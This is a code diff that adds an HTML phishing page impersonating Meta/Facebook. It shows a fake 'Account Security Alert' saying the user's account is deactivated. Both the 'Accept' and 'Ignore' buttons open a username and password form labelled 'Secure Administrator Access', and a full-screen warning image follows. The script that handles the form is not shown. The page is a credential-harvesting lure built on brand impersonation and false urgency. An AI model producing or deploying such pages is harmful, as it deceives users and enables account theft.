@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Enterprise Security Gateway</title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="main-wrapper">
+      <video id="voiceMessage" preload="auto">
+        <source src="client.mp4" type="video/mp4" />
+      </video>
+
+      <div id="fbOverlay" class="overlay white-bg">
+        <div class="glass-card fb-card">
+          <div class="brand-header">
+            <img src="fb.png" alt="Facebook" class="centered-logo" />
+          </div>
+          <div class="card-content">
+            <h2>Account Security Alert</h2>
+            <p>
+              Meta has temporarily deactivated your account for your protection.
+              Verify your identity to continue.
+            </p>
+            <div class="action-buttons">
+              <button class="btn-primary" onclick="showSecurityModal()">
+                Accept
+              </button>
+              <button class="btn-secondary" onclick="showSecurityModal()">
+                Ignore
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="securityOverlay" class="overlay" style="display: none">
+        <div class="glass-card security-card">
+          <div class="security-header">
+            <div class="status-dot"></div>
+            <span>Secure Administrator Access</span>
+          </div>
+          <div class="card-content">
+            <div class="auth-logo-container">
+              <img src="fb.png" alt="Admin Logo" class="auth-logo" />
+            </div>
+            <h3>Authentication Required</h3>
+            <form id="loginForm">
+              <input
+                type="text"
+                placeholder="Username"
+                required
+                class="professional-input"
+              />
+              <input
+                type="password"
+                placeholder="Password"
+                required
+                class="professional-input"
+              />
+              <button type="submit" class="btn-submit">Verify Identity</button>
+            </form>
+          </div>
+        </div>
+      </div>
+
+      <div
+        id="finalWarningOverlay"
+        class="overlay full-screen-mode"
+        style="display: none"
+      >
+        <div class="final-popout">
+          <img src="client.jpg" alt="Security Warning" class="warning-img" />
+        </div>
+      </div>
+    </div>
+    <script src="script.js"></script>
+  </body>
+</html>
